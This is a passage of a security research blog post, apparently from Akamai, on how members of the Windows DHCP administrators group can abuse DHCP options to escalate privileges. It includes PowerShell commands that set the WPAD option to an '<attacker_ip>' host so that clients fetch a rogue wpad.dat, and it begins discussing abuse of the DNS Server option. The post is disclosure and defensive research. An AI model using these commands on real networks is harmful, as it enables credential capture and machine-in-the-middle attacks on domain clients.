(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
  
    function getParent() {
      return doc.getElementsByTagName('head')[0];
    }
  
    function addStyle(parent, id, def) {
      if (!parent) {
        return;
      }
  
      var style = doc.createElement('style');
      style.id = id;
      style.innerHTML = def;
      parent.appendChild(style);
    }
  
    function removeStyle(parent, id) {
      if (!parent) {
        return;
      }
  
      var style = doc.getElementById(id);
  
      if (!style) {
        return;
      }
  
      parent.removeChild(style);
    }

    function initFunc() {
        addStyle(getParent(), STYLE_ID, style);
        setTimeout(function() {
            removeStyle(getParent(), STYLE_ID);
        }, timeout);
    }

          while (c.charAt(0)==' ') c = c.substring(1,c.length);

      }
      return null;
  }

  </ol>

      <h1 class="cmp-title__text">Abusing the DHCP Administrators Group to Escalate Privileges in Windows Domains</h1>
    
</div>

    


</div>
<div class="section section__vertical-center aem-GridColumn aem-GridColumn--default--12">

  
  
  
      

      

  <div class="cmp-section   " data-cmp-data-layer="{&#34;section-5667ad2fd8&#34;:{&#34;@type&#34;:&#34;akamai/components/section&#34;}}">
    
    
  
    
      <div class="cmp-section__row 1 cmp-section__2-columns">
        <div class="cmp-section__row-wrapper cmp-section__two-column--separate ">
          <div class="columns column-1  fifty-fifty">

      <span>Malicious privilege escalation can be disastrous, especially when it leverages legitimate processes. </span>
    </div>

<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-e94ab547cc&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T03:08:08Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Editorial and additional commentary by Tricia Howard&lt;/p>\r\n&#34;}}">

<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-9a264a2ede" data-cmp-data-layer="{&#34;title-9a264a2ede&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:23:39Z&#34;,&#34;dc:title&#34;:&#34;Executive summary&#34;}}">
    
      <h2 class="cmp-title__text">Executive summary</h2>
    
</div>

    


</div>
<div class="text text__pt-none aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-98ad3427a3&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T01:54:38Z&#34;,&#34;xdm:text&#34;:&#34;&lt;ul>\r\n&lt;li>&lt;p>Akamai researchers discovered a new privilege escalation technique affecting Active Directory (AD) environments that leverages the DHCP administrators group.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>&lt;b>In cases where the DHCP server role is installed on a Domain Controller (DC), this could enable them to gain domain admin privileges&lt;/b>.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>The technique is based on abuse of legitimate features and doesn’t rely on any vulnerability. Therefore, a fix for it doesn’t exist.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>In addition to providing a privilege escalation primitive, the same technique could also be used to create a stealthy domain persistence mechanism.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Microsoft DHCP server is very popular; it was observed running in 40% of the networks monitored by Akamai. Any environment running this server could be vulnerable.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>We provide detailed steps that can drastically reduce the risk from this technique, identify potential exploitation of it, as well as a way to identify the configuration that enables it.&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&#34;}}">
    <ul>
<li><p>Akamai researchers discovered a new privilege escalation technique affecting Active Directory (AD) environments that leverages the DHCP administrators group.</p>
</li>
<li><p><b>In cases where the DHCP server role is installed on a Domain Controller (DC), this could enable them to gain domain admin privileges</b>.</p>
</li>
<li><p>The technique is based on abuse of legitimate features and doesn’t rely on any vulnerability. Therefore, a fix for it doesn’t exist.</p>
</li>
<li><p>In addition to providing a privilege escalation primitive, the same technique could also be used to create a stealthy domain persistence mechanism.</p>
</li>
<li><p>Microsoft DHCP server is very popular; it was observed running in 40% of the networks monitored by Akamai. Any environment running this server could be vulnerable.</p>
</li>
<li><p>We provide detailed steps that can drastically reduce the risk from this technique, identify potential exploitation of it, as well as a way to identify the configuration that enables it.</p>
</li>
</ul>

</div>

    

</div>
<div class="button button__large-button button__cta-blue button__dark-hover button__fullWidth-mobile aem-GridColumn aem-GridColumn--default--12">

<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-b3a83e4377" data-cmp-data-layer="{&#34;title-b3a83e4377&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:26:18Z&#34;,&#34;dc:title&#34;:&#34;Introduction&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Introduction<br />
</h2>
    
</div>

    


</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-4c5bdbe548&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T01:59:53Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>From Google Docs to Active Directory, access management affects just about every role in an organization. Minimizing employee frustrations without adding unnecessary risk is a delicate balance when discussing permissions and access control — a plight security teams are painfully aware of.&lt;/p>\r\n&lt;p>As such, the “just enough access” sweet spot is a critical element of any access strategy. It boils down to this: Every user should be granted a set of privileges that are required to perform their duties, but they should be as limited as possible in any other aspect. This can reduce the impact of a compromise of any single user, preventing lateral movement and additional exploitation.&lt;/p>\r\n&lt;p>Although it would remove the most risk, managing access on an identity-by-identity basis is not realistic or feasible, especially at the enterprise level. Instead, user access groups provide generalized permissions based on job function — a concept most commonly seen in AD. For example, Microsoft provides the “DNS Admins” group, which is an AD group in charge of managing DNS servers. Following the “just enough access” principle, its members do not have permissions over the machine hosting the DNS server, but rather only for DNS service-related configuration.&lt;/p>\r\n&lt;p>Although that all works in theory — in practice, it’s a different story. Shay Ber’s 2017 research &lt;a href=\&#34;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>demonstrated&lt;/a> how members of the “DNS Admins” group could abuse one of the group’s privileges to execute code on DNS servers, which would almost always result in a privilege escalation to domain admins.&lt;/p>\r\n&lt;p>Microsoft DHCP provides a similar security group called “DHCP administrators.” While working on our &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html\&#34; target=\&#34;_self\&#34;>recent&lt;/a> &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/weaponizing-dhcp-dns-spoofing-hands-on-guide.html\&#34; target=\&#34;_self\&#34;>research&lt;/a> into Microsoft DHCP, the question of finding a similar primitive using this group came to mind: Can a DHCP administrator become a domain administrator? Well, as it turns out, sometimes it sure can. 🥴&lt;/p>\r\n&lt;p>In this blog post, we will cover the DHCP administrators group and show how one of its privileges could be abused to compromise DHCP servers, &lt;b>including a full domain takeover in cases where the DHCP server is installed on a DC&lt;/b>.&lt;/p>\r\n&lt;p>We will also show how this same technique can be used to establish an interesting domain persistence mechanism, and provide the details to implement a “&lt;a href=\&#34;#dhcp\&#34; target=\&#34;_self\&#34;>DHCP backdoor&lt;/a>.”&lt;/p>\r\n&lt;p>Since this technique uses legitimate privileges and options that are available to DHCP administrators, there isn’t a simple solution like a patch — because there is no vulnerability. To help reduce the risk from this technique, we’ve included detailed mitigation and detection steps in this blog post.&lt;/p>\r\n&#34;}}">
    <p>From Google Docs to Active Directory, access management affects just about every role in an organization. Minimizing employee frustrations without adding unnecessary risk is a delicate balance when discussing permissions and access control — a plight security teams are painfully aware of.</p>
<p>As such, the “just enough access” sweet spot is a critical element of any access strategy. It boils down to this: Every user should be granted a set of privileges that are required to perform their duties, but they should be as limited as possible in any other aspect. This can reduce the impact of a compromise of any single user, preventing lateral movement and additional exploitation.</p>
<p>Although it would remove the most risk, managing access on an identity-by-identity basis is not realistic or feasible, especially at the enterprise level. Instead, user access groups provide generalized permissions based on job function — a concept most commonly seen in AD. For example, Microsoft provides the “DNS Admins” group, which is an AD group in charge of managing DNS servers. Following the “just enough access” principle, its members do not have permissions over the machine hosting the DNS server, but rather only for DNS service-related configuration.</p>
<p>Although that all works in theory — in practice, it’s a different story. Shay Ber’s 2017 research <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" target="_blank" rel="nofollow noreferrer">demonstrated</a> how members of the “DNS Admins” group could abuse one of the group’s privileges to execute code on DNS servers, which would almost always result in a privilege escalation to domain admins.</p>
<p>Microsoft DHCP provides a similar security group called “DHCP administrators.” While working on our <a href="/blog/security-research/spoofing-dns-by-abusing-dhcp" target="_self">recent</a> <a href="/blog/security-research/weaponizing-dhcp-dns-spoofing-hands-on-guide" target="_self">research</a> into Microsoft DHCP, the question of finding a similar primitive using this group came to mind: Can a DHCP administrator become a domain administrator? Well, as it turns out, sometimes it sure can. 🥴</p>
<p>In this blog post, we will cover the DHCP administrators group and show how one of its privileges could be abused to compromise DHCP servers, <b>including a full domain takeover in cases where the DHCP server is installed on a DC</b>.</p>
<p>We will also show how this same technique can be used to establish an interesting domain persistence mechanism, and provide the details to implement a “<a href="#dhcp" target="_self">DHCP backdoor</a>.”</p>
<p>Since this technique uses legitimate privileges and options that are available to DHCP administrators, there isn’t a simple solution like a patch — because there is no vulnerability. To help reduce the risk from this technique, we’ve included detailed mitigation and detection steps in this blog post.</p>

</div>

    

</div>
<div class="button button__large-button button__cta-blue button__dark-hover button__fullWidth-mobile aem-GridColumn aem-GridColumn--default--12">

    <span class="cmp-button__text">Jump to mitigations</span>
    
</a>

<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-a1d7453d38" data-cmp-data-layer="{&#34;title-a1d7453d38&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:33:41Z&#34;,&#34;dc:title&#34;:&#34;What are DHCP administrators?&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">What are DHCP administrators?<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-de26772dee&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:54:55Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The &lt;i>DHCP administrators&lt;/i> group is an AD group of users that are intended to manage Dynamic Host Configuration Protocol (DHCP) servers. It allows its members to query and modify the configuration of the DHCP service on remote servers.&lt;/p>\r\n&lt;p>Importantly, &lt;b>its members have no permissions over the DHCP server machine itself, but only for the DHCP service configuration.&lt;/b> This means that a DHCP administrator &lt;i>should not&lt;/i> be able to execute code on a DHCP server, but only modify DHCP-related configurations. One of the configurations that is controlled by DHCP administrators is &lt;i>DHCP options&lt;/i>.&lt;/p>\r\n&#34;}}">
    <p>The <i>DHCP administrators</i> group is an AD group of users that are intended to manage Dynamic Host Configuration Protocol (DHCP) servers. It allows its members to query and modify the configuration of the DHCP service on remote servers.</p>
<p>Importantly, <b>its members have no permissions over the DHCP server machine itself, but only for the DHCP service configuration.</b> This means that a DHCP administrator <i>should not</i> be able to execute code on a DHCP server, but only modify DHCP-related configurations. One of the configurations that is controlled by DHCP administrators is <i>DHCP options</i>.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-4c61250b00" data-cmp-data-layer="{&#34;title-4c61250b00&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:43:01Z&#34;,&#34;dc:title&#34;:&#34;Abusing DHCP options&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Abusing DHCP options<br />
</h2>
    
</div>

    


</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-3809566faa&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:29:04Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Network clients require a set of configurations to participate in a network, including an IP address and a subnet mask, a default gateway address, and a DNS server, just to name a few. DHCP servers advertise these configurations to their clients in the form of DHCP options — different configurations are coupled with a defined option ID and are queried by clients (Figure 1).&lt;/p>\r\n&#34;}}">
    <p>Network clients require a set of configurations to participate in a network, including an IP address and a subnet mask, a default gateway address, and a DNS server, just to name a few. DHCP servers advertise these configurations to their clients in the form of DHCP options — different configurations are coupled with a defined option ID and are queried by clients (Figure 1).</p>

</div>

    

</div>
<div class="image aem-GridColumn--default--none aem-GridColumn--default--9 aem-GridColumn aem-GridColumn--offset--default--0">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="DHCP servers advertise these configurations to their clients in the form of DHCP options — different configurations are coupled with a defined option ID and are queried by clients (Figure 1). " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-57f06fd75f&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:55:16Z&#34;,&#34;dc:title&#34;:&#34;DHCP servers advertise these configurations to their clients in the form of DHCP options — different configurations are coupled with a defined option ID and are queried by clients (Figure 1).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;bd6ac1fe-3fb2-4284-9513-b1df4830d5c7&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T00:52:58Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig1.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig1.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="DHCP servers advertise these configurations to their clients in the form of DHCP options — different configurations are coupled with a defined option ID and are queried by clients (Figure 1). "/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 1: Examples of DHCP options configured on a DHCP server</span>
    
    
  </div>
</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-14e215f588&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:29:54Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>DHCP clients request their required options and modify their network configuration according to the responses. &lt;b>With the ability to control the values of these options on the server, each option that is requested by a client could potentially be abused by an attacker to inject malicious configuration&lt;/b>.&lt;/p>\r\n&lt;p>To understand the potential attack surface on Windows clients, we can examine the options that are requested by default (Figure 2).&lt;/p>\r\n&#34;}}">
    <p>DHCP clients request their required options and modify their network configuration according to the responses. <b>With the ability to control the values of these options on the server, each option that is requested by a client could potentially be abused by an attacker to inject malicious configuration</b>.</p>
<p>To understand the potential attack surface on Windows clients, we can examine the options that are requested by default (Figure 2).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title=" To understand the potential attack surface on Windows clients, we can examine the options that are requested by default (Figure 2)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-16897170e9&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:08:29Z&#34;,&#34;dc:title&#34;:&#34;To understand the potential attack surface on Windows clients, we can examine the options that are requested by default (Figure 2).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;e0ec19df-dd0d-42ad-95a5-c0554b7cdc25&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:06:46Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig2.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig2.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt=" To understand the potential attack surface on Windows clients, we can examine the options that are requested by default (Figure 2)."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 2: DHCP options configured on a DHCP server</span>

<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-339628256b" data-cmp-data-layer="{&#34;title-339628256b&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:30:12Z&#34;,&#34;dc:title&#34;:&#34;Proxy autodiscovery&lt;br />\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Proxy autodiscovery<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-70d3f7c251&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:04:50Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>We can see that one of the configurations requested is the “&lt;i>Proxy autodiscovery&lt;/i>” option (highlighted in blue in Figure 2), which is used to automatically configure a web proxy (&lt;a href=\&#34;https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>WPAD&lt;/a>). This option enables a DHCP server to specify the URL of a “&lt;i>wpad.dat&lt;/i>” file, which contains the proxy settings to be used by the client.&lt;/p>\r\n&lt;p>We can configure this option and specify our address as the proxy by running the following PowerShell commands:&lt;/p>\r\n&#34;}}">
    <p>We can see that one of the configurations requested is the “<i>Proxy autodiscovery</i>” option (highlighted in blue in Figure 2), which is used to automatically configure a web proxy (<a href="https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol" target="_blank" rel="nofollow noreferrer">WPAD</a>). This option enables a DHCP server to specify the URL of a “<i>wpad.dat</i>” file, which contains the proxy settings to be used by the client.</p>
<p>We can configure this option and specify our address as the proxy by running the following PowerShell commands:</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-2a2a1f91c8&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:09:12Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">Add-DhcpServerv4OptionDefinition -name wpad -OptionId 252 -type String
  Set-DhcpServerv4OptionValue -Wpad &#34;http://&lt;attacker_ip&gt;/wpad.dat&#34; -ScopeId 172.25.0.0</code>
</pre>
<button data-cmp-hook-prismjs="copy" class="cmp-prismjs__copy">Copy</button>


    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-0e0ad3bbbd&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:09:49Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>After setting this option, we see that Windows clients receive our configuration when leasing an address from the DHCP server(Figure 3).&lt;/p>\r\n&#34;}}">
    <p>After setting this option, we see that Windows clients receive our configuration when leasing an address from the DHCP server(Figure 3).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="After setting this option, we see that Windows clients receive our configuration when leasing an address from the DHCP server(Figure 3)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-2c3cdbdc1b&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:08:38Z&#34;,&#34;dc:title&#34;:&#34;After setting this option, we see that Windows clients receive our configuration when leasing an address from the DHCP server(Figure 3).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;693c7163-a1c7-4de0-8559-30df3d32fa4f&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:11:05Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig3.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig3.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="After setting this option, we see that Windows clients receive our configuration when leasing an address from the DHCP server(Figure 3)."/>

  </div>

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-34573fbba2&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:13:19Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>After receiving this configuration, the DHCP client will connect to our machine over HTTP and attempt to fetch the “&lt;i>wpad.dat&lt;/i>” file (Figure 4).&lt;/p>\r\n&#34;}}">
    <p>After receiving this configuration, the DHCP client will connect to our machine over HTTP and attempt to fetch the “<i>wpad.dat</i>” file (Figure 4).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="After receiving this configuration, the DHCP client will connect to our machine over HTTP and attempt to fetch the “wpad.dat” file (Figure 4)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-a1aa450a38&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:14:32Z&#34;,&#34;dc:title&#34;:&#34;After receiving this configuration, the DHCP client will connect to our machine over HTTP and attempt to fetch the “wpad.dat” file (Figure 4).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;ca298185-947a-44fb-aa36-1c526a586fd2&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:14:23Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig4.png&#34;}}}">
    
      
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig4.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="After receiving this configuration, the DHCP client will connect to our machine over HTTP and attempt to fetch the “wpad.dat” file (Figure 4)."/>
        
        
      
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 4: DHCP client requesting a “wpad.dat” file from the attacker’s machine</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-708ea3f3ac&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:15:55Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The ability to impersonate a WPAD server opens up the opportunity for &lt;a href=\&#34;https://github.com/lgandx/Responder/wiki/WPAD\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>several attacks&lt;/a> that can allow compromising client credentials.&lt;/p>\r\n&lt;p>There are other DHCP options we can target to achieve a similar result. This capability is certainly by design, and is not really a security problem. DHCP administrators can, well … administer DHCP. The impact of this capability, however, can be broader than expected.&lt;/p>\r\n&#34;}}">
    <p>The ability to impersonate a WPAD server opens up the opportunity for <a href="https://github.com/lgandx/Responder/wiki/WPAD" target="_blank" rel="nofollow noreferrer">several attacks</a> that can allow compromising client credentials.</p>
<p>There are other DHCP options we can target to achieve a similar result. This capability is certainly by design, and is not really a security problem. DHCP administrators can, well … administer DHCP. The impact of this capability, however, can be broader than expected.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-c1f4ae7563" data-cmp-data-layer="{&#34;title-c1f4ae7563&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:16:50Z&#34;,&#34;dc:title&#34;:&#34;DHCP DNS Server option&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">DHCP DNS Server option<br />
</h2>
    
</div>

    


</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-8d7fd66a4a&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:17:45Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>While analyzing the different DHCP options that could be abused, another one caught our attention — the &lt;i>DNS Server&lt;/i> option. In a similar manner to the previous attack, a DHCP administrator can spoof the DNS server address and spoof DNS responses to achieve a machine-in-the-middle (MITM) position. But, as it turns out, there&#39;s more to this option.&lt;/p>\r\n&#34;}}">
    <p>While analyzing the different DHCP options that could be abused, another one caught our attention — the <i>DNS Server</i> option. In a similar manner to the previous attack, a DHCP administrator can spoof the DNS server address and spoof DNS responses to achieve a machine-in-the-middle (MITM) position. But, as it turns out, there's more to this option.</p>

</div>

    

</div>
<div class="image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--5 aem-GridColumn--offset--default--0">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="But Wait, There&#39;s More" class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-966b8b00e2&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:08:47Z&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;e019366e-ac29-4088-83ea-c729f05edf43&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:08:13Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-theres-more.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-theres-more.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="But Wait, There&#39;s More"/>
        
        
      </a>
    

    
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-977cc6e02f&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:23:49Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Normally, DHCP options are used to serve data to requesting clients. Interestingly, the DNS Server option serves another purpose — its value will be used as the destination of &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html#:~:text=DNS%20Dynamic%20Updates.-,DHCP%20DNS%20Dynamic%20Updates,-DHCP%20is%20a\&#34; target=\&#34;_self\&#34;>DHCP DNS Dynamic Updates&lt;/a> (Figure 5).&lt;/p>\r\n&#34;}}">
    <p>Normally, DHCP options are used to serve data to requesting clients. Interestingly, the DNS Server option serves another purpose — its value will be used as the destination of <a href="/blog/security-research/spoofing-dns-by-abusing-dhcp#:~:text=DNS%2520Dynamic%2520Updates.-,DHCP%2520DNS%2520Dynamic%2520Updates,-DHCP%2520is%2520a" target="_self">DHCP DNS Dynamic Updates</a> (Figure 5).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
